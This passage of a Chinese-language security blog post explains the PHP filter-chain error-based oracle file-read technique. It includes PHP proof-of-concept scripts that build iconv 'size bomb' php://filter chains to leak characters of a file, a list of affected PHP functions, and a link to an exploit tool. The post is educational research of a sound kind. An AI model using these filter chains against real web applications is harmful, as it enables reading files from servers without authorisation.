+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">13</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$size_bomb</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UCS-4|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$guess_char</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$remove_junk_chars</span> <span class="o">=</span> <span class="s2">&#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$guess_char</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|</span><span class="si">$remove_junk_chars</span><span class="s2">|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rot13filter</span> <span class="o">=</span> <span class="s2">&#34;string.rot13|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">$rot13filter$guess_char</span><span class="s2">|dechunk|</span><span class="si">$size_bomb</span><span class="s2">/resource=/tmp/test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;IBM-930 conversions : &#34;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&#34;, the first character is &#34;</span><span class="o">.</span><span class="s2">&#34;rqpon&#34;</span><span class="p">[</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="retrieving-0-9-characters" class="headerLink">
+    <a href="#retrieving-0-9-characters" class="header-mark"></a>Retrieving [0-9] characters</h3><p>这里就用到base64编码和解码的知识，可以看看我之前写的filterchain
+就行了。然后这里就写一个表总结一下
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterleak/3.png"
+        srcset="/img/filterleak/3.png, /img/filterleak/3.png 1.5x, /img/filterleak/3.png 2x"
+        alt="/img/filterleak/3.png"
+        title="/img/filterleak/3.png" ></figure>
+这样子就很容易知道是数字几了。</p>
+<h3 id="retrieving-other-letters" class="headerLink">
+    <a href="#retrieving-other-letters" class="header-mark"></a>Retrieving other letters</h3><p>这个具体也是利用前面说的利用IBM和ASCII的特性区别来进行确定。
+例如：Z在ASCII表示为0x5A，而在IBM-285中0x5A却表示<code>!</code>
+然后转化为IBM-280他就会变成0x4F，然后0x4F又表示o在ASCII中，我们再用rot13来过滤一下他就会变成B，也就刚好是dechunk获取到的B了。
+具体的就不用多说了吧。</p>
+<h3 id="invalid-multi-bytes-sequence-explanation" class="headerLink">
+    <a href="#invalid-multi-bytes-sequence-explanation" class="header-mark"></a>Invalid multi-bytes sequence explanation</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$size_bomb</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">20</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$size_bomb</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UCS-4|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$guess_char</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$remove_junk_chars</span> <span class="o">=</span> <span class="s2">&#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$guess_char</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|</span><span class="si">$remove_junk_chars</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$swap_bits</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF16.UTF16|convert.iconv.UCS-4LE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.UCS-4|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">$swap_bits$guess_char</span><span class="s2">|dechunk|</span><span class="si">$size_bomb</span><span class="s2">/resource=/tmp/test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;IBM-930 conversions : &#34;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&#34;, the fifth character is &#34;</span><span class="o">.</span><span class="s2">&#34;edcba&#34;</span><span class="p">[</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>到这里基本上整个利用都讲完了。其实本质上就是利用过滤器的特性来不断确定最终字符。</p>
+<h1 id="受影响的函数" class="headerLink">
+    <a href="#%e5%8f%97%e5%bd%b1%e5%93%8d%e7%9a%84%e5%87%bd%e6%95%b0" class="header-mark"></a>受影响的函数</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_get_contents</span>
+</span></span><span class="line"><span class="cl"><span class="nx">readfile</span>
+</span></span><span class="line"><span class="cl"><span class="nx">finfo</span><span class="o">-&gt;</span><span class="na">file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">getimagesize</span>
+</span></span><span class="line"><span class="cl"><span class="nx">md5_file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">hash_file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">sha1_file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">parse_ini_file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">parse_ini_file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file</span>
+</span></span><span class="line"><span class="cl"><span class="nx">copy</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span> <span class="p">(</span><span class="nx">only</span> <span class="nx">target</span> <span class="nx">read</span> <span class="nx">only</span> <span class="nx">with</span> <span class="k">this</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">stream_get_contents</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fgetsfread</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fgetc</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fgetcsv</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fpassthru</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fputs</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后也有工具可以直接利用
+<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit" target="_blank" rel="noopener noreferrer">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
+<p>reference：
+<a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle" target="_blank" rel="noopener noreferrer">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-07-25</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/hitcon2024/" class="prev" rel="prev" title="HITCON CTF 2024 web复现"><i class="fas fa-angle-left fa-fw"></i>HITCON CTF 2024 web复现</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
